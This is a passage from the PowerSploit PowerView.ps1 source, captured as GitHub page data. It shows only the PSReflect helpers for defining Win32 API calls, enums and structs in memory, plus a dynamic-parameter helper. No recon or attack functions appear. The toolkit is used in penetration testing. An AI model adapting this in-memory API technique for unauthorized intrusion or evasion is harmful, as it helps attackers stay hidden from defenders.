owerSploit.pssproj","contentType":"file"},{"name":"PowerSploit.sln","path":"PowerSploit.sln","contentType":"file"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"mkdocs.yml","path":"mkdocs.yml","contentType":"file"}],"totalCount":18}},"fileTreeProcessingTime":5.823284,"foldersToFetch":[],"repo":{"id":4456049,"defaultBranch":"master","name":"PowerSploit","ownerLogin":"PowerShellMafia","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2012-05-26T16:08:48.000Z","ownerAvatar":"https://avatars.githubusercontent.com/u/15639068?v=4","public":true,"private":false,"isOrgOwned":true},"codeLineWrapEnabled":false,"symbolsExpanded":false,"treeExpanded":true,"refInfo":{"name":"master","listCacheKey":"v0:1465092567.0","canEdit":false,"refType":"branch","currentOid":"d943001a7defb5e0d1657085a77a0e78609be58f"},"path":"Recon/PowerView.ps1","currentUser":null,"blob":{"rawLines":["#requires -version 2","","\u003c#","","PowerSploit File: PowerView.ps1","Author: Will Schroeder (@harmj0y)","License: BSD 3-Clause","Required Dependencies: None","","#\u003e","","","########################################################","#","# PSReflect code for Windows API access","# Author: @mattifestation","#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1","#","########################################################","","function New-InMemoryModule {","\u003c#",".SYNOPSIS","","Creates an in-memory assembly and module","","Author: Matthew Graeber (@mattifestation)","License: BSD 3-Clause","Required Dependencies: None","Optional Dependencies: None","",".DESCRIPTION","","When defining custom enums, structs, and unmanaged functions, it is","necessary to associate to an assembly module. This helper function","creates an in-memory module that can be passed to the 'enum',","'struct', and Add-Win32Type functions.","",".PARAMETER ModuleName","","Specifies the desired name for the in-memory assembly and module. If","ModuleName is not provided, it will default to a GUID.","",".EXAMPLE","","$Module = New-InMemoryModule -ModuleName Win32","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [CmdletBinding()]","    Param (","        [Parameter(Position = 0)]","        [ValidateNotNullOrEmpty()]","        [String]","        $ModuleName = [Guid]::NewGuid().ToString()","    )","","    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())","    $LoadedAssemblies = $AppDomain.GetAssemblies()","","    foreach ($Assembly in $LoadedAssemblies) {","        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {","            return $Assembly","        }","    }","","    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)","    $Domain = $AppDomain","    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')","    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)","","    return $ModuleBuilder","}","","","# A helper function used to reduce typing while defining function","# prototypes for Add-Win32Type.","function func {","    Param (","        [Parameter(Position = 0, Mandatory = $True)]","        [String]","        $DllName,","","        [Parameter(Position = 1, Mandatory = $True)]","        [string]","        $FunctionName,","","        [Parameter(Position = 2, Mandatory = $True)]","        [Type]","        $ReturnType,","","        [Parameter(Position = 3)]","        [Type[]]","        $ParameterTypes,","","        [Parameter(Position = 4)]","        [Runtime.InteropServices.CallingConvention]","        $NativeCallingConvention,","","        [Parameter(Position = 5)]","        [Runtime.InteropServices.CharSet]","        $Charset,","","        [String]","        $EntryPoint,","","        [Switch]","        $SetLastError","    )","","    $Properties = @{","        DllName = $DllName","        FunctionName = $FunctionName","        ReturnType = $ReturnType","    }","","    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }","    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }","    if ($Charset) { $Properties['Charset'] = $Charset }","    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }","    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }","","    New-Object PSObject -Property $Properties","}","","","function Add-Win32Type","{","\u003c#",".SYNOPSIS","","Creates a .NET type for an unmanaged Win32 function.","","Author: Matthew Graeber (@mattifestation)","License: BSD 3-Clause","Required Dependencies: None","Optional Dependencies: func","",".DESCRIPTION","","Add-Win32Type enables you to easily interact with unmanaged (i.e.","Win32 unmanaged) functions in PowerShell. After providing","Add-Win32Type with a function signature, a .NET type is created","using reflection (i.e. csc.exe is never called like with Add-Type).","","The 'func' helper function can be used to reduce typing when defining","multiple function definitions.","",".PARAMETER DllName","","The name of the DLL.","",".PARAMETER FunctionName","","The name of the target function.","",".PARAMETER EntryPoint","","The DLL export function name. This argument should be specified if the","specified function name is different than the name of the exported","function.","",".PARAMETER ReturnType","","The return type of the function.","",".PARAMETER ParameterTypes","","The function parameters.","",".PARAMETER NativeCallingConvention","","Specifies the native calling convention of the function. Defaults to","stdcall.","",".PARAMETER Charset","","If you need to explicitly call an 'A' or 'W' Win32 function, you can","specify the character set.","",".PARAMETER SetLastError","","Indicates whether the callee calls the SetLastError Win32 API","function before returning from the attributed method.","",".PARAMETER Module","","The in-memory module that will host the functions. Use","New-InMemoryModule to define an in-memory module.","",".PARAMETER Namespace","","An optional namespace to prepend to the type. Add-Win32Type defaults","to a namespace consisting only of the name of the DLL.","",".EXAMPLE","","$Mod = New-InMemoryModule -ModuleName Win32","","$FunctionDefinitions = @(","  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),","  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),","  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())",")","","$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'","$Kernel32 = $Types['kernel32']","$Ntdll = $Types['ntdll']","$Ntdll::RtlGetCurrentPeb()","$ntdllbase = $Kernel32::GetModuleHandle('ntdll')","$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')","",".NOTES","","Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189","","When defining multiple function prototypes, it is ideal to provide","Add-Win32Type with an array of function signatures. That way, they","are all incorporated into the same in-memory module.","#\u003e","","    [OutputType([Hashtable])]","    Param(","        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]","        [String]","        $DllName,","","        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]","        [String]","        $FunctionName,","","        [Parameter(ValueFromPipelineByPropertyName=$True)]","        [String]","        $EntryPoint,","","        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]","        [Type]","        $ReturnType,","","        [Parameter(ValueFromPipelineByPropertyName=$True)]","        [Type[]]","        $ParameterTypes,","","        [Parameter(ValueFromPipelineByPropertyName=$True)]","        [Runtime.InteropServices.CallingConvention]","        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,","","        [Parameter(ValueFromPipelineByPropertyName=$True)]","        [Runtime.InteropServices.CharSet]","        $Charset = [Runtime.InteropServices.CharSet]::Auto,","","        [Parameter(ValueFromPipelineByPropertyName=$True)]","        [Switch]","        $SetLastError,","","        [Parameter(Mandatory=$True)]","        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]","        $Module,","","        [ValidateNotNull()]","        [String]","        $Namespace = ''","    )","","    BEGIN","    {","        $TypeHash = @{}","    }","","    PROCESS","    {","        if ($Module -is [Reflection.Assembly])","        {","            if ($Namespace)","            {","                $TypeHash[$DllName] = $Module.GetType(\"$Namespace.$DllName\")","            }","            else","            {","                $TypeHash[$DllName] = $Module.GetType($DllName)","            }","        }","        else","        {","            # Define one type for each DLL","            if (!$TypeHash.ContainsKey($DllName))","            {","                if ($Namespace)","                {","                    $TypeHash[$DllName] = $Module.DefineType(\"$Namespace.$DllName\", 'Public,BeforeFieldInit')","                }","                else","                {","                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')","                }","            }","","            $Method = $TypeHash[$DllName].DefineMethod(","                $FunctionName,","                'Public,Static,PinvokeImpl',","                $ReturnType,","                $ParameterTypes)","","            # Make each ByRef parameter an Out parameter","            $i = 1","            foreach($Parameter in $ParameterTypes)","            {","                if ($Parameter.IsByRef)","                {","                    [void] $Method.DefineParameter($i, 'Out', $null)","                }","","                $i++","            }","","            $DllImport = [Runtime.InteropServices.DllImportAttribute]","            $SetLastErrorField = $DllImport.GetField('SetLastError')","            $CallingConventionField = $DllImport.GetField('CallingConvention')","            $CharsetField = $DllImport.GetField('CharSet')","            $EntryPointField = $DllImport.GetField('EntryPoint')","            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }","","            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }","","            # Equivalent to C# version of [DllImport(DllName)]","            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])","            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,","                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),","                [Reflection.FieldInfo[]] @($SetLastErrorField,","                                           $CallingConventionField,","                                           $CharsetField,","                                           $EntryPointField),","                [Object[]] @($SLEValue,","                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),","                             ([Runtime.InteropServices.CharSet] $Charset),","                             $ExportedFuncName))","","            $Method.SetCustomAttribute($DllImportAttribute)","        }","    }","","    END","    {","        if ($Module -is [Reflection.Assembly])","        {","            return $TypeHash","        }","","        $ReturnTypes = @{}","","        foreach ($Key in $TypeHash.Keys)","        {","            $Type = $TypeHash[$Key].CreateType()","","            $ReturnTypes[$Key] = $Type","        }","","        return $ReturnTypes","    }","}","","","function psenum {","\u003c#",".SYNOPSIS","","Creates an in-memory enumeration for use in your PowerShell session.","","Author: Matthew Graeber (@mattifestation)","License: BSD 3-Clause","Required Dependencies: None","Optional Dependencies: None","",".DESCRIPTION","","The 'psenum' function facilitates the creation of enums entirely in","memory using as close to a \"C style\" as PowerShell will allow.","",".PARAMETER Module","","The in-memory module that will host the enum. Use","New-InMemoryModule to define an in-memory module.","",".PARAMETER FullName","","The fully-qualified name of the enum.","",".PARAMETER Type","","The type of each enum element.","",".PARAMETER EnumElements","","A hashtable of enum elements.","",".PARAMETER Bitfield","","Specifies that the enum should be treated as a bitfield.","",".EXAMPLE","","$Mod = New-InMemoryModule -ModuleName Win32","","$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{","    UNKNOWN =                  0","    NATIVE =                   1 # Image doesn't require a subsystem.","    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.","    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.","    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.","    POSIX_CUI =                7 # Image runs in the Posix character subsystem.","    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.","    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.","    EFI_APPLICATION =          10","    EFI_BOOT_SERVICE_DRIVER =  11","    EFI_RUNTIME_DRIVER =       12","    EFI_ROM =                  13","    XBOX =                     14","    WINDOWS_BOOT_APPLICATION = 16","}","",".NOTES","","PowerShell purists may disagree with the naming of this function but","again, this was developed in such a way so as to emulate a \"C style\"","definition as closely as possible. Sorry, I'm not going to name it","New-Enum. :P","#\u003e","","    [OutputType([Type])]","    Param (","        [Parameter(Position = 0, Mandatory=$True)]","        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]","        $Module,","","        [Parameter(Position = 1, Mandatory=$True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $FullName,","","        [Parameter(Position = 2, Mandatory=$True)]","        [Type]","        $Type,","","        [Parameter(Position = 3, Mandatory=$True)]","        [ValidateNotNullOrEmpty()]","        [Hashtable]","        $EnumElements,","","        [Switch]","        $Bitfield","    )","","    if ($Module -is [Reflection.Assembly])","    {","        return ($Module.GetType($FullName))","    }","","    $EnumType = $Type -as [Type]","","    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)","","    if ($Bitfield)","    {","        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())","        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())","        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)","    }","","    foreach ($Key in $EnumElements.Keys)","    {","        # Apply the specified enum type to each element","        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)","    }","","    $EnumBuilder.CreateType()","}","","","# A helper function used to reduce typing while defining struct","# fields.","function field {","    Param (","        [Parameter(Position = 0, Mandatory=$True)]","        [UInt16]","        $Position,","","        [Parameter(Position = 1, Mandatory=$True)]","        [Type]","        $Type,","","        [Parameter(Position = 2)]","        [UInt16]","        $Offset,","","        [Object[]]","        $MarshalAs","    )","","    @{","        Position = $Position","        Type = $Type -as [Type]","        Offset = $Offset","        MarshalAs = $MarshalAs","    }","}","","","function struct","{","\u003c#",".SYNOPSIS","","Creates an in-memory struct for use in your PowerShell session.","","Author: Matthew Graeber (@mattifestation)","License: BSD 3-Clause","Required Dependencies: None","Optional Dependencies: field","",".DESCRIPTION","","The 'struct' function facilitates the creation of structs entirely in","memory using as close to a \"C style\" as PowerShell will allow. Struct","fields are specified using a hashtable where each field of the struct","is comprosed of the order in which it should be defined, its .NET","type, and optionally, its offset and special marshaling attributes.","","One of the features of 'struct' is that after your struct is defined,","it will come with a built-in GetSize method as well as an explicit","converter so that you can easily cast an IntPtr to the struct without","relying upon calling SizeOf and/or PtrToStructure in the Marshal","class.","",".PARAMETER Module","","The in-memory module that will host the struct. Use","New-InMemoryModule to define an in-memory module.","",".PARAMETER FullName","","The fully-qualified name of the struct.","",".PARAMETER StructFields","","A hashtable of fields. Use the 'field' helper function to ease","defining each field.","",".PARAMETER PackingSize","","Specifies the memory alignment of fields.","",".PARAMETER ExplicitLayout","","Indicates that an explicit offset for each field will be specified.","",".EXAMPLE","","$Mod = New-InMemoryModule -ModuleName Win32","","$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{","    DOS_SIGNATURE =    0x5A4D","    OS2_SIGNATURE =    0x454E","    OS2_SIGNATURE_LE = 0x454C","    VXD_SIGNATURE =    0x454C","}","","$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{","    e_magic =    field 0 $ImageDosSignature","    e_cblp =     field 1 UInt16","    e_cp =       field 2 UInt16","    e_crlc =     field 3 UInt16","    e_cparhdr =  field 4 UInt16","    e_minalloc = field 5 UInt16","    e_maxalloc = field 6 UInt16","    e_ss =       field 7 UInt16","    e_sp =       field 8 UInt16","    e_csum =     field 9 UInt16","    e_ip =       field 10 UInt16","    e_cs =       field 11 UInt16","    e_lfarlc =   field 12 UInt16","    e_ovno =     field 13 UInt16","    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)","    e_oemid =    field 15 UInt16","    e_oeminfo =  field 16 UInt16","    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)","    e_lfanew =   field 18 Int32","}","","# Example of using an explicit layout in order to create a union.","$TestUnion = struct $Mod TestUnion @{","    field1 = field 0 UInt32 0","    field2 = field 1 IntPtr 0","} -ExplicitLayout","",".NOTES","","PowerShell purists may disagree with the naming of this function but","again, this was developed in such a way so as to emulate a \"C style\"","definition as closely as possible. Sorry, I'm not going to name it","New-Struct. :P","#\u003e","","    [OutputType([Type])]","    Param (","        [Parameter(Position = 1, Mandatory=$True)]","        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]","        $Module,","","        [Parameter(Position = 2, Mandatory=$True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $FullName,","","        [Parameter(Position = 3, Mandatory=$True)]","        [ValidateNotNullOrEmpty()]","        [Hashtable]","        $StructFields,","","        [Reflection.Emit.PackingSize]","        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,","","        [Switch]","        $ExplicitLayout","    )","","    if ($Module -is [Reflection.Assembly])","    {","        return ($Module.GetType($FullName))","    }","","    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,","        Class,","        Public,","        Sealed,","        BeforeFieldInit'","","    if ($ExplicitLayout)","    {","        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout","    }","    else","    {","        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout","    }","","    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)","    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]","    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))","","    $Fields = New-Object Hashtable[]($StructFields.Count)","","    # Sort each field according to the orders specified","    # Unfortunately, PSv2 doesn't have the luxury of the","    # hashtable [Ordered] accelerator.","    foreach ($Field in $StructFields.Keys)","    {","        $Index = $StructFields[$Field]['Position']","        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}","    }","","    foreach ($Field in $Fields)","    {","        $FieldName = $Field['FieldName']","        $FieldProp = $Field['Properties']","","        $Offset = $FieldProp['Offset']","        $Type = $FieldProp['Type']","        $MarshalAs = $FieldProp['MarshalAs']","","        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')","","        if ($MarshalAs)","        {","            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])","            if ($MarshalAs[1])","            {","                $Size = $MarshalAs[1]","                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,","                    $UnmanagedType, $SizeConst, @($Size))","            }","            else","            {","                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))","            }","","            $NewField.SetCustomAttribute($AttribBuilder)","        }","","        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }","    }","","    # Make the struct aware of its own size.","    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!","    $SizeMethod = $StructBuilder.DefineMethod('GetSize',","        'Public, Static',","        [Int],","        [Type[]] @())","    $ILGenerator = $SizeMethod.GetILGenerator()","    # Thanks for the help, Jason Shirk!","    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)","    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,","        [Type].GetMethod('GetTypeFromHandle'))","    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,","        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))","    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)","","    # Allow for explicit casting from an IntPtr","    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!","    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',","        'PrivateScope, Public, Static, HideBySig, SpecialName',","        $StructBuilder,","        [Type[]] @([IntPtr]))","    $ILGenerator2 = $ImplicitConverter.GetILGenerator()","    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)","    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)","    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)","    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,","        [Type].GetMethod('GetTypeFromHandle'))","    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,","        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))","    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)","    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)","","    $StructBuilder.CreateType()","}","","","########################################################","#","# Misc. helpers","#","########################################################","","Function New-DynamicParameter {","\u003c#",".SYNOPSIS","","Helper function to simplify creating dynamic parameters.","","    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.","    Originally released under the Microsoft Public License (Ms-PL).","",".DESCRIPTION","","Helper function to simplify creating dynamic parameters.","","Example use cases:","    Include parameters only if your environment dictates it","    Include parameters depending on the value of a user-specified parameter","    Provide tab completion and intellisense for parameters, depending on the environment","","Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.","    Use New-DynamicParameter with 'CreateVariables' switch in your main code block,","    ('Process' for advanced functions) to create those variables.","    Alternatively, manually reference $PSBoundParameters for the dynamic parameter value.","","This function has two operating modes:","","1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,","with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.","","2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.","Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,","with custom conditions and so on.","",".NOTES","","Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:","    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1","    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/","    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/","","Credit to BM for alias and type parameters and their handling","",".PARAMETER Name","","Name of the dynamic parameter","",".PARAMETER Type","","Type for the dynamic parameter.  Default is string","",".PARAMETER Alias","","If specified, one or more aliases to assign to the dynamic parameter","",".PARAMETER Mandatory","","If specified, set the Mandatory attribute for this dynamic parameter","",".PARAMETER Position","","If specified, set the Position attribute for this dynamic parameter","",".PARAMETER HelpMessage","","If specified, set the HelpMessage for this dynamic parameter","",".PARAMETER DontShow","","If specified, set the DontShow for this dynamic parameter.","This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.","http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/","",".PARAMETER ValueFromPipeline","","If specified, set the ValueFromPipeline attribute for this dynamic parameter","",".PARAMETER ValueFromPipelineByPropertyName","","If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter","",".PARAMETER ValueFromRemainingArguments","","If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter","",".PARAMETER ParameterSetName","","If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.","",".PARAMETER AllowNull","","If specified, set the AllowNull attribute of this dynamic parameter","",".PARAMETER AllowEmptyString","","If specified, set the AllowEmptyString attribute of this dynamic parameter","",".PARAMETER AllowEmptyCollection","","If specified, set the AllowEmptyCollection attribute of this dynamic parameter","",".PARAMETER ValidateNotNull","","If specified, set the ValidateNotNull attribute of this dynamic parameter","",".PARAMETER ValidateNotNullOrEmpty","","If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter","",".PARAMETER ValidateRange","","If specified, set the ValidateRange attribute of this dynamic parameter","",".PARAMETER ValidateLength","","If specified, set the ValidateLength attribute of this dynamic parameter","",".PARAMETER ValidatePattern","","If specified, set the ValidatePattern attribute of this dynamic parameter","",".PARAMETER ValidateScript","","If specified, set the ValidateScript attribute of this dynamic parameter","",".PARAMETER ValidateSet","","If specified, set the ValidateSet attribute of this dynamic parameter","",".PARAMETER Dictionary","","If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.","Appropriate for custom dynamic parameters creation.","","If not specified, create and return a RuntimeDefinedParameterDictionary","Appropriate for a simple dynamic parameter creation.","#\u003e","","    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]","    Param (","        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateNotNullOrEmpty()]","        [string]$Name,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [System.Type]$Type = [int],","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [string[]]$Alias,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$Mandatory,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [int]$Position,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [string]$HelpMessage,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$DontShow,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$ValueFromPipeline,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$ValueFromPipelineByPropertyName,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$ValueFromRemainingArguments,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [string]$ParameterSetName = '__AllParameterSets',","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$AllowNull,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$AllowEmptyString,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$AllowEmptyCollection,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$ValidateNotNull,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [switch]$ValidateNotNullOrEmpty,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateCount(2,2)]","        [int[]]$ValidateCount,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateCount(2,2)]","        [int[]]$ValidateRange,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateCount(2,2)]","        [int[]]$ValidateLength,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateNotNullOrEmpty()]","        [string]$ValidatePattern,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateNotNullOrEmpty()]","        [scriptblock]$ValidateScript,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateNotNullOrEmpty()]","        [string[]]$ValidateSet,","","        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]","        [ValidateNotNullOrEmpty()]","        [ValidateScript({","            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))","            {","                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'","            }","            $true","        })]","        $Dictionary = $false,","","        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]","        [switch]$CreateVariables,","","        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]","        [ValidateNotNullOrEmpty()]","        [ValidateScript({","            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,","            # so one can't use PowerShell's '-is' operator to validate type.","            if($_.GetType().Name -notmatch 'Dictionary') {","                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'","            }","            $true","        })]","        $BoundParameters","    )","","    Begin {","        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary","        function _temp { [CmdletBinding()] Param() }","        $CommonParameters = (Get-Command _temp).Parameters.Keys","    }","","    Process {","        if($CreateVariables) {","            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }","            ForEach($Parameter in $BoundKeys) {","                if ($Parameter) {","                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force","                }","            }","        }","        else {","            $StaleKeys = @()","            $StaleKeys = $PSBoundParameters.GetEnumerator() |","                        ForEach-Object {","                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {","                                # If object has Equals, compare bound key and variable using it","                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {","                                    $_.Key","                                }","                            }","                            else {","                                # If object doesn't has Equals (e.g. $null), fallback to the PowerShell's -ne operator","                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {","                                    $_.Key","                                }","                            }","                        }","            if($StaleKeys) {","                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}","            }","","            # Since we rely solely on $PSBoundParameters, we don't have access to default values for unbound parameters","            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |","                                        # Find parameters that are belong to the current parameter set","                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |","                                            Select-Object -ExpandProperty Key |","                                                # Find unbound parameters in the current parameter set","                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }","","            # Even if parameter is not bound, corresponding variable is created with parameter's default value (if specified)","            $tmp = $null","            ForEach ($Parameter in $UnboundParameters) {","                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0","                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {","                    $PSBoundParameters.$Parameter = $DefaultValue","                }","            }","","            if($Dictionary) {","                $DPDictionary = $Dictionary","            }","            else {","                $DPDictionary = $InternalDictionary","            }","","            # Shortcut for getting local variables","            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}","","            # Strings to match attributes and validation arguments","            $AttributeRegex = 